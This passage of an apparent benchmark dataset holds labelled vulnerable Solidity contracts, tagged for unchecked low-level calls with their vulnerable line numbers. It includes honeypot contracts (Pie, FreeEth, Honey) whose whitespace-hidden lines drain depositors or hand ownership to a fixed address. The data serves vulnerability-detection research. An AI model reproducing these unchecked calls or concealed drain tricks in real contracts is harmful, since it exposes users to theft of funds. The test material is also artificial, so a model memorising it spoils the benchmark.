    // This is a general safty function that allows the owner to do a lot
    //  of things in the unlikely event that something goes wrong
    // _dst is the contract being called making this like a 1/1 multisig
    function execute(address _dst, uint _value, bytes _data) onlyOwner {
         // <yes> <report> UNCHECKED_LL_CALLS
        _dst.call.value(_value)(_data);
    }
}
// contract WedIndex 
contract WedIndex is Owned {
    // declare index data variables
    string public wedaddress;
    string public partnernames;
    uint public indexdate;
    uint public weddingdate;
    uint public displaymultisig;
    IndexArray[] public indexarray;
    struct IndexArray {
        uint indexdate;
        string wedaddress;
        string partnernames;
        uint weddingdate;
        uint displaymultisig;
    }
    function numberOfIndex() constant public returns (uint) {
        return indexarray.length;
    }
    // make functions to write and read index entries and nubmer of entries
    function writeIndex(uint indexdate, string wedaddress, string partnernames, uint weddingdate, uint displaymultisig) {
        indexarray.push(IndexArray(now, wedaddress, partnernames, weddingdate, displaymultisig));
        IndexWritten(now, wedaddress, partnernames, weddingdate, displaymultisig);
    }
    // declare events
    event IndexWritten (uint time, string contractaddress, string partners, uint weddingdate, uint display);
}",[47]
"            if (!msg.sender.call.value(msg.value)()) {
                throw;
            }
            externalCallFlag = false;
            return newVersion;
        }
        if (msg.value < MIN_FEE) {
            externalCallFlag = true;
            // If the amount of ether sent by the requester is too little or
            // too much, refund the requester and discard the request.
            if (!msg.sender.call.value(msg.value)()) {
                throw;
            }
            externalCallFlag = false;
            return FAIL_FLAG;
        } else {
            // Record the request.
            uint64 requestId = requestCnt;
            requestCnt++;
            unrespondedCnt++;
            bytes32 paramsHash = sha3(requestType, requestData);
            requests[requestId].requester = msg.sender;
            requests[requestId].fee = msg.value;
            requests[requestId].callbackAddr = callbackAddr;
            requests[requestId].callbackFID = callbackFID;
            requests[requestId].paramsHash = paramsHash;
            // Log the request for the Town Crier server to process.
            RequestInfo(requestId, requestType, msg.sender, msg.value, callbackAddr, paramsHash, timestamp, requestData);
            return requestId;
        }
    }
    function deliver(uint64 requestId, bytes32 paramsHash, uint64 error, bytes32 respData) public {
        if (msg.sender != SGX_ADDRESS ||
                requestId <= 0 ||
                requests[requestId].requester == 0 ||
                requests[requestId].fee == DELIVERED_FEE_FLAG) {
            // If the response is not delivered by the SGX account or the
            // request has already been responded to, discard the response.
            return;
        }
        uint fee = requests[requestId].fee;
        if (requests[requestId].paramsHash != paramsHash) {
            // If the hash of request parameters in the response is not
            // correct, discard the response for security concern.
            return;
        } else if (fee == CANCELLED_FEE_FLAG) {
            // If the request is cancelled by the requester, cancellation
            // fee goes to the SGX account and set the request as having
            // been responded to.
            // <yes> <report> UNCHECKED_LL_CALLS
            SGX_ADDRESS.send(CANCELLATION_FEE);
            requests[requestId].fee = DELIVERED_FEE_FLAG;
            unrespondedCnt--;
            return;
        }
        requests[requestId].fee = DELIVERED_FEE_FLAG;
        unrespondedCnt--;
        if (error < 2) {
            // Either no error occurs, or the requester sent an invalid query.
            // Send the fee to the SGX account for its delivering.
            // <yes> <report> UNCHECKED_LL_CALLS
            SGX_ADDRESS.send(fee);
        } else {
            // Error in TC, refund the requester.
            externalCallFlag = true;
            // <yes> <report> UNCHECKED_LL_CALLS
            requests[requestId].requester.call.gas(2300).value(fee)();
            externalCallFlag = false;
        }
        uint callbackGas = (fee - MIN_FEE) / tx.gasprice; // gas left for the callback function
        DeliverInfo(requestId, fee, tx.gasprice, msg.gas, callbackGas, paramsHash, error, respData); // log the response information
        if (callbackGas > msg.gas - 5000) {
            callbackGas = msg.gas - 5000;
        }
        externalCallFlag = true;
        // <yes> <report> UNCHECKED_LL_CALLS
        requests[requestId].callbackAddr.call.gas(callbackGas)(requests[requestId].callbackFID, requestId, error, respData); // call the callback function in the application contract
        externalCallFlag = false;
    }
    function cancel(uint64 requestId) public returns (int) {
        if (externalCallFlag) {
            throw;
        }
        if (killswitch) {
            return 0;
        }
        uint fee = requests[requestId].fee;
        if (requests[requestId].requester == msg.sender && fee >= CANCELLATION_FEE) {
            // If the request was sent by this user and has money left on it,
            // then cancel it.
            requests[requestId].fee = CANCELLED_FEE_FLAG;
            externalCallFlag = true;
            if (!msg.sender.call.value(fee - CANCELLATION_FEE)()) {
                throw;
            }
            externalCallFlag = false;
            Cancel(requestId, msg.sender, requests[requestId].requester, requests[requestId].fee, 1);
            return SUCCESS_FLAG;
        } else {
            Cancel(requestId, msg.sender, requests[requestId].requester, fee, -1);
            return FAIL_FLAG;
        }
    }
}","[51, 62, 67, 77]"
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 44,97
 */
pragma solidity ^0.4.18;
contract Ownable
{
    address newOwner;
    address owner = msg.sender;
    function changeOwner(address addr)
    public
    onlyOwner
    {
        newOwner = addr;
    }
    function confirmOwner() 
    public
    {
        if(msg.sender==newOwner)
        {
            owner=newOwner;
        }
    }
    modifier onlyOwner
    {
        if(owner == msg.sender)_;
    }
}
contract Token is Ownable
{
    address owner = msg.sender;
    function WithdrawToken(address token, uint256 amount,address to)
    public 
    onlyOwner
    {
        // <yes> <report> UNCHECKED_LL_CALLS
        token.call(bytes4(sha3(""transfer(address,uint256)"")),to,amount); 
    }
}
contract TokenBank is Token
{
    uint public MinDeposit;
    mapping (address => uint) public Holders;
     ///Constructor
    function initTokenBank()
    public
    {
        owner = msg.sender;
        MinDeposit = 1 ether;
    }
    function()
    payable
    {
        Deposit();
    }
    function Deposit() 
    payable
    {
        if(msg.value>=MinDeposit)
        {
            Holders[msg.sender]+=msg.value;
        }
    }
    function WitdrawTokenToHolder(address _to,address _token,uint _amount)
    public
    onlyOwner
    {
        if(Holders[_to]>0)
        {
            Holders[_to]=0;
            WithdrawToken(_token,_amount,_to);     
        }
    }
    function WithdrawToHolder(address _addr, uint _wei) 
    public
    onlyOwner
    payable
    {
        if(Holders[msg.sender]>0)
        {
            if(Holders[_addr]>=_wei)
            {
                // <yes> <report> UNCHECKED_LL_CALLS
                _addr.call.value(_wei);
                Holders[_addr]-=_wei;
            }
        }
    }
    function Bal() public constant returns(uint){return this.balance;}
}","[38, 85]"
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 55
 */
pragma solidity ^0.4.16;
/// @author Jordi Baylina
/// Auditors: Griff Green & psdev
/// @notice Based on http://hudsonjameson.com/ethereummarriage/
/// License: GNU-3
/// @dev `Owned` is a base level contract that assigns an `owner` that can be
///  later changed
contract Owned {
    /// @dev `owner` is the only address that can call a function with this
    /// modifier
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    address public owner;
    /// @notice The Constructor assigns the message sender to be `owner`
    function Owned() {
        owner = msg.sender;
    }
    address public newOwner;
    /// @notice `owner` can step down and assign some other address to this role
    /// @param _newOwner The address of the new owner
    ///  an unowned neutral vault, however that cannot be undone
    function changeOwner(address _newOwner) onlyOwner {
        newOwner = _newOwner;
    }
    /// @notice `newOwner` has to accept the ownership before it is transferred
    ///  Any account or any contract with the ability to call `acceptOwnership`
    ///  can be used to accept ownership of this contract, including a contract
    ///  with no other functions
    function acceptOwnership() {
        if (msg.sender == newOwner) {
            owner = newOwner;
        }
    }
    // This is a general safty function that allows the owner to do a lot
    //  of things in the unlikely event that something goes wrong
    // _dst is the contract being called making this like a 1/1 multisig
    function execute(address _dst, uint _value, bytes _data) onlyOwner {
         // <yes> <report> UNCHECKED_LL_CALLS
        _dst.call.value(_value)(_data);
    }
}
contract Marriage is Owned
{
    // Marriage data variables
    string public partner1;
    string public partner2;
    uint public marriageDate;
    string public marriageStatus;
    string public vows;
    Event[] public majorEvents;
    Message[] public messages;
    struct Event {
        uint date;
        string name;
        string description;
        string url;
    }
    struct Message {
        uint date;
        string nameFrom;
        string text;
        string url;
        uint value;
    }
    modifier areMarried {
        require(sha3(marriageStatus) == sha3(""Married""));
        _;
    }
    //Set Owner
    function Marriage(address _owner) {
        owner = _owner;
    }
    function numberOfMajorEvents() constant public returns (uint) {
        return majorEvents.length;
    }
    function numberOfMessages() constant public returns (uint) {
        return messages.length;
    }
    // Create initial marriage contract
    function createMarriage(
        string _partner1,
        string _partner2,
        string _vows,
        string url) onlyOwner
    {
        require(majorEvents.length == 0);
        partner1 = _partner1;
        partner2 = _partner2;
        marriageDate = now;
        vows = _vows;
        marriageStatus = ""Married"";
        majorEvents.push(Event(now, ""Marriage"", vows, url));
        MajorEvent(""Marrigage"", vows, url);
    }
    // Set the marriage status if it changes
    function setStatus(string status, string url) onlyOwner
    {
        marriageStatus = status;
        setMajorEvent(""Changed Status"", status, url);
    }
    // Set the IPFS hash of the image of the couple
    function setMajorEvent(string name, string description, string url) onlyOwner areMarried
    {
        majorEvents.push(Event(now, name, description, url));
        MajorEvent(name, description, url);
    }
    function sendMessage(string nameFrom, string text, string url) payable areMarried {
        if (msg.value > 0) {
            owner.transfer(this.balance);
        }
        messages.push(Message(now, nameFrom, text, url, msg.value));
        MessageSent(nameFrom, text, url, msg.value);
    }
    // Declare event structure
    event MajorEvent(string name, string description, string url);
    event MessageSent(string name, string description, string url, uint value);
}",[46]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 54,65
 */
pragma solidity ^0.4.23;        
// ----------------------------------------------------------------------------------------------
// Project Delta 
// DELTA - New Crypto-Platform with own cryptocurrency, verified smart contracts and multi blockchains!
// For 1 DELTA token in future you will get 1 DELTA coin!
// Site: http://delta.money
// Telegram Chat: @deltacoin
// Telegram News: @deltaico
// CEO Nechesov Andrey http://facebook.com/Nechesov     
// Telegram: @Nechesov
// Ltd. ""Delta""
// Working with ERC20 contract https://etherscan.io/address/0xf85a2e95fa30d005f629cbe6c6d2887d979fff2a                  
// ----------------------------------------------------------------------------------------------
contract Delta {     
	address public c = 0xF85A2E95FA30d005F629cBe6c6d2887D979ffF2A; 
	address public owner = 0x788c45dd60ae4dbe5055b5ac02384d5dc84677b0;	
	address public owner2 = 0x0C6561edad2017c01579Fd346a58197ea01A0Cf3;	
	uint public active = 1;	
	uint public token_price = 10**18*1/1000; 	
	//default function for buy tokens      
	function() payable {        
	    tokens_buy();        
	}
	/**
	* Buy tokens
	*/
    function tokens_buy() payable returns (bool) {         
        require(active > 0);
        require(msg.value >= token_price);        
        uint tokens_buy = msg.value*10**18/token_price;
        require(tokens_buy > 0);
        if(!c.call(bytes4(sha3(""transferFrom(address,address,uint256)"")),owner, msg.sender,tokens_buy)){
        	return false;
        }
        uint sum2 = msg.value * 3 / 10;           
        // <yes> <report> UNCHECKED_LL_CALLS
        owner2.send(sum2);
        return true;
      }     
      //Withdraw money from contract balance to owner
      function withdraw(uint256 _amount) onlyOwner returns (bool result) {
          uint256 balance;
          balance = this.balance;
          if(_amount > 0) balance = _amount;
          // <yes> <report> UNCHECKED_LL_CALLS
          owner.send(balance);
          return true;
      }
      //Change token
      function change_token_price(uint256 _token_price) onlyOwner returns (bool result) {
        token_price = _token_price;
        return true;
      }
      //Change active
      function change_active(uint256 _active) onlyOwner returns (bool result) {
        active = _active;
        return true;
      }
      // Functions with this modifier can only be executed by the owner
    	modifier onlyOwner() {
        if (msg.sender != owner) {
            throw;
        }
        _;
    }        	
}","[42, 51]"
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 31
 */
pragma solidity ^0.4.18;
contract AirDropContract{
    function AirDropContract() public {
    }
    modifier validAddress( address addr ) {
        require(addr != address(0x0));
        require(addr != address(this));
        _;
    }
    function transfer(address contract_address,address[] tos,uint[] vs)
        public 
        validAddress(contract_address)
        returns (bool){
        require(tos.length > 0);
        require(vs.length > 0);
        require(tos.length == vs.length);
        bytes4 id = bytes4(keccak256(""transferFrom(address,address,uint256)""));
        for(uint i = 0 ; i < tos.length; i++){
            // <yes> <report> UNCHECKED_LL_CALLS
            contract_address.call(id, msg.sender, tos[i], vs[i]);
        }
        return true;
    }
}",[25]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 16
 */
pragma solidity ^0.4.18;
contract EBU{
    function transfer(address from,address caddress,address[] _tos,uint[] v)public returns (bool){
        require(_tos.length > 0);
        bytes4 id=bytes4(keccak256(""transferFrom(address,address,uint256)""));
        for(uint i=0;i<_tos.length;i++){
            // <yes> <report> UNCHECKED_LL_CALLS
            caddress.call(id,from,_tos[i],v[i]);
        }
        return true;
    }
}",[13]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 69,71,73,75,102
 */
pragma solidity ^0.4.23;
contract Splitter{
	address public owner;
	address[] public puppets;
	mapping (uint256 => address) public extra;
	address private _addy;
	uint256 private _share;
	uint256 private _count;
//constructor
	constructor() payable public{
		owner = msg.sender;
		newPuppet();
		newPuppet();
		newPuppet();
		newPuppet();
		extra[0] = puppets[0];
        extra[1] = puppets[1];
        extra[2] = puppets[2];
        extra[3] = puppets[3];
	}
//withdraw (just in case)
	function withdraw() public{
		require(msg.sender == owner);
		owner.transfer(address(this).balance);
	}
//puppet count
	function getPuppetCount() public constant returns(uint256 puppetCount){
    	return puppets.length;
  	}
//deploy contracts
	function newPuppet() public returns(address newPuppet){
	    require(msg.sender == owner);
    	Puppet p = new Puppet();
    	puppets.push(p);
    	return p;
  		}
//update mapping
    function setExtra(uint256 _id, address _newExtra) public {
        require(_newExtra != address(0));
        extra[_id] = _newExtra;
    }
//fund puppets TROUBLESHOOT gas
    function fundPuppets() public payable {
        require(msg.sender == owner);
    	_share = SafeMath.div(msg.value, 4);
		// <yes> <report> UNCHECKED_LL_CALLS
        extra[0].call.value(_share).gas(800000)();
		// <yes> <report> UNCHECKED_LL_CALLS
        extra[1].call.value(_share).gas(800000)();
		// <yes> <report> UNCHECKED_LL_CALLS
        extra[2].call.value(_share).gas(800000)();
		// <yes> <report> UNCHECKED_LL_CALLS
        extra[3].call.value(_share).gas(800000)();
        }
//fallback function
function() payable public{
	}
}
contract Puppet {
    mapping (uint256 => address) public target;
    mapping (uint256 => address) public master;
	constructor() payable public{
		//target[0] = 0x42D21d1182F3aDD44064F23c1F98843D4B9fd8aa;
		target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;
        master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;
	}
	//send shares to doubler
	//return profit to master
	function() public payable{
	    if(msg.sender != target[0]){
			// <yes> <report> UNCHECKED_LL_CALLS
			target[0].call.value(msg.value).gas(600000)();
		}
    }
	//emergency withdraw
	function withdraw() public{
		require(msg.sender == master[0]);
		master[0].transfer(address(this).balance);
	}
}
//library
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
    if (a == 0) {
      return 0;
    }
    c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return a / b;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
    c = a + b;
    assert(c >= a);
    return c;
  }
}","[52, 54, 56, 58, 77]"
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 14
 */
pragma solidity ^0.4.24;
contract Proxy  {
    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 
    function proxy(address target, bytes data) public payable {
        // <yes> <report> UNCHECKED_LL_CALLS
        target.call.value(msg.value)(data);
    }
}
contract DepositProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;
    function () public payable { }
    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            deposit();
        }
    }
    function deposit() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }
    function withdraw(uint256 amount) public onlyOwner {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            msg.sender.transfer(amount);
        }
    }
}",[12]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 33
 */
pragma solidity ^0.4.24;
contract SimpleWallet {
    address public owner = msg.sender;
    uint public depositsCount;
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    function() public payable {
        depositsCount++;
    }
    function withdrawAll() public onlyOwner {
        withdraw(address(this).balance);
    }
    function withdraw(uint _value) public onlyOwner {
        msg.sender.transfer(_value);
    }
    function sendMoney(address _target, uint _value) public onlyOwner {
        // <yes> <report> UNCHECKED_LL_CALLS
        _target.call.value(_value)();
    }
}",[25]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 100,106,133
 */
// by nightman
// winner gets the contract balance
// 0.02 to play
pragma solidity ^0.4.23;
contract DrainMe {
//constants
address public winner = 0x0;
address public owner;
address public firstTarget = 0x461ec7309F187dd4650EE6b4D25D93c922d7D56b;
address public secondTarget = 0x1C3E062c77f09fC61550703bDd1D59842C22c766;
address[] public players;
mapping(address=>bool) approvedPlayers;
uint256 public secret;
uint256[] public seed = [951828771,158769871220];
uint256[] public balance;
//constructor
function DranMe() public payable{
	owner = msg.sender;
}
//modifiers
modifier onlyOwner() {
    require(msg.sender == owner);
    _;
}
modifier onlyWinner() {
    require(msg.sender == winner);
    _;
}
modifier onlyPlayers() {
    require(approvedPlayers[msg.sender]);
    _;
}
//functions
function getLength() public constant returns(uint256) {
	return seed.length;
}
function setSecret(uint256 _secret) public payable onlyOwner{
	secret = _secret;
}
function getPlayerCount() public constant returns(uint256) {
	return players.length;
}
function getPrize() public constant returns(uint256) {
	return address(this).balance;
}
function becomePlayer() public payable{
	require(msg.value >= 0.02 ether);
	players.push(msg.sender);
	approvedPlayers[msg.sender]=true;
}
function manipulateSecret() public payable onlyPlayers{
	require (msg.value >= 0.01 ether);
	if(msg.sender!=owner || unlockSecret()){
	    uint256 amount = 0;
        msg.sender.transfer(amount);
	}
}
function unlockSecret() private returns(bool){
    bytes32 hash = keccak256(blockhash(block.number-1));
    uint256 secret = uint256(hash);
        if(secret%5==0){
            winner = msg.sender;
            return true;
        }
        else{
            return false;
        }
    }
function callFirstTarget () public payable onlyPlayers {
	require (msg.value >= 0.005 ether);
	// <yes> <report> UNCHECKED_LL_CALLS
	firstTarget.call.value(msg.value)();
}
function callSecondTarget () public payable onlyPlayers {
	require (msg.value >= 0.005 ether);
	// <yes> <report> UNCHECKED_LL_CALLS
	secondTarget.call.value(msg.value)();
}
function setSeed (uint256 _index, uint256 _value) public payable onlyPlayers {
	seed[_index] = _value;
}
function addSeed (uint256 _add) public payable onlyPlayers {
	seed.length = _add;
}
function guessSeed (uint256 _seed) public payable onlyPlayers returns(uint256) {
	return (_seed / (seed[0]*seed[1]));
	if((_seed / (seed[0]*seed[1])) == secret) {
		owner = winner;
	}
}
function checkSecret () public payable onlyPlayers returns(bool) {
    require(msg.value >= 0.01 ether);
    if(msg.value == secret){
        return true;
    }
}
function winPrize() public payable onlyOwner {
	// <yes> <report> UNCHECKED_LL_CALLS
	owner.call.value(1 wei)();
}
function claimPrize() public payable onlyWinner {
	winner.transfer(address(this).balance);
}
//fallback function
function() public payable{
	}
}","[77, 82, 104]"
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 25
 */
pragma solidity ^0.4.23;
/*
!!! THIS CONTRACT IS EXPLOITABLE AND FOR EDUCATIONAL PURPOSES ONLY !!!
This smart contract allows a user to (insecurely) store funds
in this smart contract and withdraw them at any later point in time
*/
contract keepMyEther {
    mapping(address => uint256) public balances;
    function () payable public {
        balances[msg.sender] += msg.value;
    }
    function withdraw() public {
        // <yes> <report> UNCHECKED_LL_CALLS
        msg.sender.call.value(balances[msg.sender])();
        balances[msg.sender] = 0;
    }
}",[19]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 14
 */
pragma solidity ^0.4.23;
contract Proxy  {
    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 
    function proxy(address target, bytes data) public payable {
        // <yes> <report> UNCHECKED_LL_CALLS
        target.call.value(msg.value)(data);
    }
}
contract VaultProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;
    function () public payable { }
    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            deposit();
        }
    }
    function deposit() public payable {
        if (msg.value > 0.25 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }
    function withdraw(uint256 amount) public onlyOwner {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            msg.sender.transfer(amount);
        }
    }
}",[12]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 14
 */
pragma solidity ^0.4.24;
contract Proxy  {
    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 
    function proxy(address target, bytes data) public payable {
        // <yes> <report> UNCHECKED_LL_CALLS
        target.call.value(msg.value)(data);
    }
}
contract VaultProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;
    function () public payable { }
    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            deposit();
        }
    }
    function deposit() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }
    function withdraw(uint256 amount) public onlyOwner {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            msg.sender.transfer(amount);
        }
    }
}",[12]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 44
 */
pragma solidity ^0.4.19;
contract Pie
{
    address public Owner = msg.sender;
    function()
    public
    payable
    {
    }
    function Get()
    public
    payable
    {                                                                    
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Owner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        // <yes> <report> UNCHECKED_LL_CALLS
        adr.call.value(msg.value)(data);
    }
}",[37]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 16
 */
pragma solidity ^0.4.24;
contract demo{
    function transfer(address from,address caddress,address[] _tos,uint v)public returns (bool){
        require(_tos.length > 0);
        bytes4 id=bytes4(keccak256(""transferFrom(address,address,uint256)""));
        for(uint i=0;i<_tos.length;i++){
            // <yes> <report> UNCHECKED_LL_CALLS
            caddress.call(id,from,_tos[i],v);
        }
        return true;
    }
}",[13]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 39
 */
pragma solidity ^0.4.19;
contract FreeEth
{
    address public Owner = msg.sender;
    function() public payable{}
    function GetFreebie()
    public
    payable
    {                                                                    
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af){Owner=0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;}
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        // <yes> <report> UNCHECKED_LL_CALLS
        adr.call.value(msg.value)(data);
    }
}",[33]
"    event Donate(uint256 amount, address donator);
    event FailedPayment(address paidUser, uint amount);
    event Payment(address noPaidUser, uint amount);
    event JackpotPayment(address player, uint ticketID, uint jackpotWin);
    // constructor
    constructor (address whaleAddress, address autoPlayBotAddress, address secretSignerAddress) public {
        owner = msg.sender;
        autoPlayBot = autoPlayBotAddress;
        whale = whaleAddress;
        secretSigner = secretSignerAddress;
        jackpotSize = 0;
        devFeeSize = 0;
        lockedInBets = 0;
        totalAmountToWhale = 0;
    }
    // modifiers
    modifier onlyOwner() {
        require (msg.sender == owner, ""You are not the owner of this contract!"");
        _;
    }
    modifier onlyBot() {
        require (msg.sender == autoPlayBot, ""You are not the bot of this contract!"");
        _;
    }
    modifier checkContractHealth() {
        require (address(this).balance >= lockedInBets + jackpotSize + devFeeSize, ""This contract doesn't have enough balance, it is stopped till someone donate to this game!"");
        _;
    }
    // betMast:
    // false is front, true is back
    function() public payable { }
    function setBotAddress(address autoPlayBotAddress)
    onlyOwner()
    external
    {
        autoPlayBot = autoPlayBotAddress;
    }
    function setSecretSigner(address _secretSigner)
    onlyOwner()
    external
    {
        secretSigner = _secretSigner;
    }
    // wager function
    function wager(bool bMask, uint ticketID, uint ticketLastBlock, uint8 v, bytes32 r, bytes32 s)
    checkContractHealth()
    external
    payable {
        Bet storage bet = bets[ticketID];
        uint amount = msg.value;
        address player = msg.sender;
        require (bet.player == address(0), ""Ticket is not new one!"");
        require (amount >= MIN_BET, ""Your bet is lower than minimum bet amount"");
        require (amount <= MAX_BET, ""Your bet is higher than maximum bet amount"");
        require (getCollateralBalance() >= 2 * amount, ""If we accept this, this contract will be in danger!"");
        require (block.number <= ticketLastBlock, ""Ticket has expired."");
        bytes32 signatureHash = keccak256(abi.encodePacked('\x19Ethereum Signed Message:\n37', uint40(ticketLastBlock), ticketID));
        require (secretSigner == ecrecover(signatureHash, v, r, s), ""web3 vrs signature is not valid."");
        jackpotSize += amount * JACKPOT_FEE / 1000;
        devFeeSize += amount * DEV_FEE / 1000;
        lockedInBets += amount * WIN_X / 1000;
        uint donate_amount = amount * DONATING_X / 1000;
        // <yes> <report> UNCHECKED_LL_CALLS
        whale.call.value(donate_amount)(bytes4(keccak256(""donate()"")));
        totalAmountToWhale += donate_amount;
        bet.amount = amount;
        bet.blockNumber = block.number;
        bet.betMask = bMask;
        bet.player = player;
        emit Wager(ticketID, bet.amount, bet.blockNumber, bet.betMask, bet.player);
    }
    // method to determine winners and losers
    function play(uint ticketReveal)
    checkContractHealth()
    external
    {
        uint ticketID = uint(keccak256(abi.encodePacked(ticketReveal)));
        Bet storage bet = bets[ticketID];
        require (bet.player != address(0), ""TicketID is not correct!"");
        require (bet.amount != 0, ""Ticket is already used one!"");
        uint256 blockNumber = bet.blockNumber;
        if(blockNumber < block.number && blockNumber >= block.number - BET_EXPIRATION_BLOCKS)
        {
            uint256 random = uint256(keccak256(abi.encodePacked(blockhash(blockNumber),  ticketReveal)));
            bool maskRes = (random % 2) !=0;
            uint jackpotRes = random % JACKPOT_MODULO;
            uint tossWinAmount = bet.amount * WIN_X / 1000;
            uint tossWin = 0;
            uint jackpotWin = 0;
            if(bet.betMask == maskRes) {
                tossWin = tossWinAmount;
            }
            if(jackpotRes == 0) {
                jackpotWin = jackpotSize;
                jackpotSize = 0;
            }
            if (jackpotWin > 0) {
                emit JackpotPayment(bet.player, ticketID, jackpotWin);
            }
            if(tossWin + jackpotWin > 0)
            {
                payout(bet.player, tossWin + jackpotWin, ticketID, maskRes, jackpotRes);
            }
            else
            {
                loseWager(bet.player, bet.amount, ticketID, maskRes, jackpotRes);
            }
            lockedInBets -= tossWinAmount;
            bet.amount = 0;
        }
        else
        {
            revert();
        }
    }
    function donateForContractHealth()
    external
    payable
    {
        donateAmount[msg.sender] += msg.value;
        emit Donate(msg.value, msg.sender);
    }
    function withdrawDonation(uint amount)
    external
    {
        require(donateAmount[msg.sender] >= amount, ""You are going to withdraw more than you donated!"");
        if (sendFunds(msg.sender, amount)){
            donateAmount[msg.sender] -= amount;",[64]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 44
 */
pragma solidity ^0.4.19;
contract Honey
{
    address public Owner = msg.sender;
    function()
    public
    payable
    {
    }
    function GetFreebie()
    public
    payable
    {                                                                    
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
